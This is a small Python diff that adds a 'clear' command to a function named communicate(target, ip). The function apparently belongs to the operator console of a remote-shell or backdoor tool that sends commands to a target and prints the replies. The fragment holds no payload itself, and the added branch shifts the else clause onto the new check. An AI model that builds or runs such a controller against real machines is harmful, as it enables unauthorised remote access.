@@ -47,6 +47,8 @@ def communicate(target, ip):
             quit()
         if command[:3] == "cd ":
             pass
+        if command == "clear":
+            os.system('cls||clear')
         else:
             result = reliable_receive(target)
             print(result)
